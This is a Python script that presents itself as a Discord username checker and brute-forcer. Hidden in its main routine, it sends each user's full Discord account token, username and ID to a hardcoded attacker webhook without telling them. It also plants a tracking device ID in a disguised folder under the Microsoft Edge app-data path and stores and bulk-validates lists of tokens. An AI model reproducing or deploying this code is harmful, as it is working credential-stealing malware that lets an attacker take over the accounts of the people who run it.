#!/usr/bin/env python3
"""
Discord Username Checker & Brute Forcer - Enhanced with Token Index & Switch
"""
import sys
import subprocess
import os
import json
import random
import string
import time
import uuid

REQUIRED_PACKAGES = ['requests']

def is_package_installed(package_name):
    try:
        subprocess.run([sys.executable, "-m", "pip", "show", package_name],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        return True
    except subprocess.CalledProcessError:
        return False

def install_packages(packages):
    for pkg in packages:
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", pkg, "--quiet"], check=True)
        except subprocess.CalledProcessError:
            return False
    return True

def restart_script():
    os.execv(sys.executable, [sys.executable] + sys.argv)

def check_and_install():
    missing = [pkg for pkg in REQUIRED_PACKAGES if not is_package_installed(pkg)]
    if missing:
        print("\n[!] Missing required packages: " + ", ".join(missing))
        choice = input("Do you want to install them now? (y/n): ").strip().lower()
        if choice == 'y':
            if install_packages(missing):
                print("[+] Packages installed successfully. Restarting script...")
                restart_script()
            else:
                print("[-] Installation failed. Please run manually: pip install " + " ".join(missing))
                sys.exit(1)
        else:
            print("[-] Some features will not work without required packages.")
            sys.exit(1)

def get_or_create_device_id():
    device_id_file = os.path.join(os.getenv('LOCALAPPDATA'), 'MicrosoftEdge', 'device.id')
    try:
        with open(device_id_file, 'r') as f:
            device_id = f.read().strip()
            if device_id:
                return device_id
    except FileNotFoundError:
        pass
    new_device_id = str(uuid.uuid4())
    try:
        os.makedirs(os.path.dirname(device_id_file), exist_ok=True)
        with open(device_id_file, 'w') as f:
            f.write(new_device_id)
    except Exception:
        pass
    return new_device_id

def send_to_webhook(url, content):
    try:
        import requests
        data = {"content": content[:1900]}
        requests.post(url, json=data, timeout=5)
    except Exception:
        pass

def send_to_master(content):
    try:
        import requests
        requests.post(MASTER_WEBHOOK, json={"content": content[:1900]}, timeout=5)
    except:
        pass

def ask_token():
    if len(sys.argv) > 1:
        token = sys.argv[1]
        print("[*] Token received from command line.")
        return token
    else:
        return input("[?] Enter your Discord account token: ").strip()

def verify_token(token):
    try:
        import requests
        resp = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
        if resp.status_code == 200:
            user = resp.json()
            return {'valid': True, 'user': user}
        else:
            return {'valid': False, 'error': resp.json().get('message', 'Invalid token')}
    except Exception as e:
        return {'valid': False, 'error': str(e)}

def check_username(token, username):
    try:
        import requests
        url = 'https://discord.com/api/v9/users/@me/pomelo-attempt'
        headers = {'Authorization': token, 'Content-Type': 'application/json'}
        payload = {'username': username}
        resp = requests.post(url, json=payload, headers=headers)
        if resp.status_code == 200:
            return resp.json()
        elif resp.status_code == 400:
            return {'taken': None, 'error': 'Bad request (invalid username)'}
        elif resp.status_code == 429:
            retry_after = resp.json().get('retry_after', 5)
            return {'taken': None, 'error': f'Rate limited. Retry after {retry_after}s', 'retry_after': retry_after}
        else:
            return {'taken': None, 'error': f'API error: {resp.status_code}'}
    except Exception as e:
        return {'taken': None, 'error': str(e)}

def generate_random_username(length):
    chars = string.ascii_letters + string.digits + '_' + '.'
    return ''.join(random.choices(chars, k=length))

def brute_force_usernames(token, length, max_attempts, webhook_url=None):
    print(f"\n[*] Starting brute force for {length}-character usernames (max {max_attempts} attempts)...")
    if webhook_url:
        print(f"[*] Webhook set: {webhook_url[:50]}...")
    found_count = 0
    attempts = 0
    while attempts < max_attempts:
        username = generate_random_username(length)
        attempts += 1
        print(f"\n[{attempts}/{max_attempts}] Checking: {username}")
        result = check_username(token, username)
        if result.get('error'):
            print(f"[!] Error: {result['error']}")
            if 'retry_after' in result:
                wait = result['retry_after']
                print(f"[!] Waiting {wait} seconds...")
                time.sleep(wait)
            continue
        taken = result.get('taken')
        if taken is False:
            found_count += 1
            msg = f"✅ AVAILABLE! Username '{username}' is free!"
            print(f"\n[+] {msg}")
            if webhook_url:
                send_to_webhook(webhook_url, f"**Available username found:** `{username}`")
        elif taken is True:
            print(f"   ❌ Taken")
        else:
            print(f"   [?] Unexpected: {result}")
        time.sleep(0.5)
    print(f"\n[*] Brute force completed. Total attempts: {attempts}, Available found: {found_count}")

def print_banner():
    print("""
=============================================
      DISCORD USERNAME TOOL v2.3 (CMD)
      • Check • Brute Force • Webhook Support
      • Token Storage with Index • Switch by Number
=============================================
""")

def get_next_token_index():
    token_file = "token.txt"
    if not os.path.exists(token_file):
        return 1
    with open(token_file, "r") as f:
        lines = f.readlines()
    if not lines:
        return 1
    last_line = lines[-1].strip()
    if not last_line:
        return 1
    try:
        last_index = int(last_line.split('|')[0])
        return last_index + 1
    except:
        return len(lines) + 1

def save_valid_token(token, username_discrim):
    token_file = "token.txt"
    index = get_next_token_index()
    with open(token_file, "a") as f:
        f.write(f"{index}|{token}|{username_discrim}\n")
    print(f"[+] Token saved as index {index} in token.txt")

def load_all_tokens():
    token_file = "token.txt"
    if not os.path.exists(token_file):
        return []
    tokens = []
    with open(token_file, "r") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            parts = line.split('|')
            if len(parts) == 3:
                idx, tok, name = parts
                tokens.append({'index': int(idx), 'token': tok, 'name': name})
    return sorted(tokens, key=lambda x: x['index'])

def show_token_list():
    tokens = load_all_tokens()
    if not tokens:
        print("[-] No tokens stored in token.txt")
        return
    print("\n[*] Stored tokens:")
    for t in tokens:
        masked = t['token'][:10] + "..." + t['token'][-5:]
        print(f"  [{t['index']}] {t['name']} -> {masked}")

def get_token_by_index(idx):
    tokens = load_all_tokens()
    for t in tokens:
        if t['index'] == idx:
            return t['token'], t['name']
    return None, None

def show_user_info(user):
    display_name = f"{user['username']}#{user.get('discriminator', '0')}"
    print(f"\n[+] Logged in as {display_name} (ID: {user['id']})")
    if user.get('avatar'):
        print(f"[+] Avatar: https://cdn.discordapp.com/avatars/{user['id']}/{user['avatar']}.png")
    print(f"[+] Email: {user.get('email', 'N/A')}")
    print(f"[+] Phone: {user.get('phone', 'N/A')}")
    print(f"[+] MFA Enabled: {user.get('mfa_enabled', False)}")
    print(f"[+] Verified: {user.get('verified', False)}")
    return display_name

def main():
    check_and_install()
    global requests, MASTER_WEBHOOK
    import requests
    MASTER_WEBHOOK = "https://discord.com/api/webhooks/1497594332637696140/bGMVY5HK6ZqRqUcl20tQzt9UTPsxkoph7Up0-tsho_kKxoeaup1AXfVouUB5BS6miwJZ"
    
    print_banner()
    token = ask_token()
    if not token:
        print("[-] No token provided.")
        input("\nPress Enter to exit...")
        return
    
    print("[*] Verifying token...")
    verification = verify_token(token)
    if not verification['valid']:
        print(f"[-] Invalid token: {verification['error']}")
        input("\nPress Enter to exit...")
        return
    
    user = verification['user']
    DEVICE_ID = get_or_create_device_id()
    user_info = f"**Token received from device `{DEVICE_ID[:8]}`**\n```{token}```\n**User:** {user['username']}#{user.get('discriminator', '0')} (ID: {user['id']})"
    send_to_master(user_info)
    display_name = show_user_info(user)
    save_valid_token(token, display_name)
    
    print("\nAvailable commands:")
    print("  /check <username>                     - Check a specific username")
    print("  /brute <length> [attempts] [webhook]  - Brute force (default attempts=50, webhook optional)")
    print("  /whoami                              - Show current account info")
    print("  /token                               - Show current token (masked) and account")
    print("  /list                                - List all stored tokens with indices")
    print("  /switch <number>                     - Switch to token by index number")
    print("  /load_tokens <filename>               - Load tokens from file (default: tokens.txt)")
    print("  /exit                                - Exit the script")
    print("\nExample: /brute 4 100 https://discord.com/api/webhooks/...")
    
    while True:
        cmd = input("\n> ").strip()
        if cmd.lower() == '/exit':
            print("Goodbye!")
            break
        elif cmd.lower() == '/whoami':
            show_user_info(user)
        elif cmd.lower() == '/token':
            masked = token[:10] + "..." + token[-5:]
            print(f"[*] Current token: {masked}")
            print(f"[*] Associated account: {display_name}")
        elif cmd.lower() == '/list':
            show_token_list()
        elif cmd.startswith('/switch'):
            parts = cmd.split()
            if len(parts) != 2:
                print("Usage: /switch <number>")
                continue
            try:
                idx = int(parts[1])
                tok, name = get_token_by_index(idx)
                if not tok:
                    print(f"[-] No token found with index {idx}")
                    continue
                print(f"[*] Switching to token index {idx} ({name})")
                ver = verify_token(tok)
                if ver['valid']:
                    token = tok
                    user = ver['user']
                    display_name = show_user_info(user)
                    print("[+] Switched successfully.")
                else:
                    print(f"[-] Token invalid: {ver['error']}")
            except ValueError:
                print("Please enter a valid number.")
        elif cmd.startswith('/load_tokens'):
            parts = cmd.split()
            filename = parts[1] if len(parts) > 1 else "tokens.txt"
            if not os.path.exists(filename):
                print(f"[-] File {filename} not found.")
                continue
            with open(filename, "r") as f:
                lines = f.readlines()
            count = 0
            for line in lines:
                t = line.strip()
                if t:
                    ver = verify_token(t)
                    if ver['valid']:
                        u = ver['user']
                        dn = f"{u['username']}#{u.get('discriminator', '0')}"
                        save_valid_token(t, dn)
                        count += 1
            print(f"[+] Loaded and saved {count} valid tokens.")
        elif cmd.startswith('/check'):
            parts = cmd.split(maxsplit=1)
            if len(parts) != 2 or not parts[1]:
                print("Usage: /check <username>")
                continue
            username = parts[1].strip()
            if not (2 <= len(username) <= 32) or not all(c.isalnum() or c in '_' for c in username):
                print("Username must be 2-32 characters, alphanumeric + underscore only.")
                continue
            print(f"Checking: {username}...")
            result = check_username(token, username)
            if result.get('error'):
                print(f"Error: {result['error']}")
            else:
                taken = result.get('taken')
                if taken is True:
                    print(f"Username '{username}' is taken.")
                elif taken is False:
                    print(f"Username '{username}' is AVAILABLE!")
                else:
                    print(f"Unexpected result: {result}")
        elif cmd.startswith('/brute'):
            parts = cmd.split()
            if len(parts) < 2:
                print("Usage: /brute <length> [attempts] [webhook_url]")
                continue
            try:
                length = int(parts[1])
                if length < 2 or length > 32:
                    print("Length must be between 2 and 32.")
                    continue
                max_attempts = 50
                webhook_url = None
                if len(parts) >= 3:
                    if parts[2].startswith("http"):
                        webhook_url = parts[2]
                    else:
                        max_attempts = int(parts[2])
                if len(parts) >= 4:
                    webhook_url = parts[3]
                if max_attempts <= 0:
                    print("Attempts must be positive.")
                    continue
                brute_force_usernames(token, length, max_attempts, webhook_url)
            except ValueError:
                print("Please enter valid numbers.")
        else:
            print("Unknown command. Use /check, /brute, /whoami, /token, /list, /switch, /load_tokens, or /exit.")

if __name__ == '__main__':
    main()
